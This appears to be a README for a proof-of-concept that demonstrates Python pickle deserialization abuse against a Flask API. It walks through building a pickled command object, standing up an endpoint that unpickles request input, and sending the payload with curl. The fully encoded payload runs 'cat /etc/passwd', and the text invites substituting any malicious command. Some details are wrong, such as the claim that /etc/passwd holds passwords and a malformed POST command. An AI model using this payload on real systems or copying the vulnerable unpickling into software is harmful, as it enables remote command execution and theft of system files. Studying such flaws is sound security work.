# api_deserialization_abuse
POC code illustrating a deserialization abuse over an API
 
Steps to produce a Deserialization attack/abuse against the API:
 
Step 1: Print out a serialized, URL encoded string of the command you wish to execute on a remote target (API Server).
- On the API server, install python 2 with apt install python 2.
- Create a python script. This script will produce a serialized output of the adversary’s command/object. In this POC code, the command is `cat /etc/passwd` but you can replace it with any (malicious) command you want.
 
- Chmod the genpickle.py script with 777 rights, and run the script
- Copy the output that appears on screen and paste it into the URLencoder at https://www.urlencoder.org/. Copy this encoded string for use by client in step 2.
 
Step 2. Create the Flask script that will produce the API endpoint URL and deserialize the command object
- On the API server, install pip3 with apt install python-pip3.
- Install flask with pip install flask.
- Chmod the python script api.py
 
Note: You’ll notice the urllibe.parse import in the script. This is required for any POST parameter parsing. I don’t know why, but when POSTing parameters, you need to handle the values/strings differently from when doing a GET with query parameters in the URL. 
 
- Run the flask API service with ./api.py.
- Send the serialized command object to the API server as a parameter value.
- On an API client, perform a test using cURL to see if the API service works. Insert your url-encoded string accordingly.
 
GET query: curl <Server_URL>:<Port>/?cmd=<url_encoded_string>
Example curl command (executed from localhost of server) for returning all etc/passwd users and passwords:
curl http://127.0.0.1/?cmd=csubprocess%0Acheck_output%0Ap1%0A%28%28lp2%0AS%27cat%27%0Ap3%0AaS%27%2Fetc%2Fpasswd%27%0Ap4%0AatRp5%0A.
 
POST query: curl POST <Server_URL>:<Port> -d ‘{“cmd”:“csubprocess%0Acheck_output%0Ap1%0A%28%28lp2%0AS%27cat%27%0Ap3%0AaS%27%2Fetc%2Fpasswd%27%0Ap4%0AatRp5%0A.”}’
Example curl command (executed from localhost of server) for returning all etc/passwd users and passwords:
curl http://127.0.0.1/?cmd=csubprocess%0Acheck_output%0Ap1%0A%28%28lp2%0AS%27cat%27%0Ap3%0AaS%27%2Fetc%2Fpasswd%27%0Ap4%0AatRp5%0A.
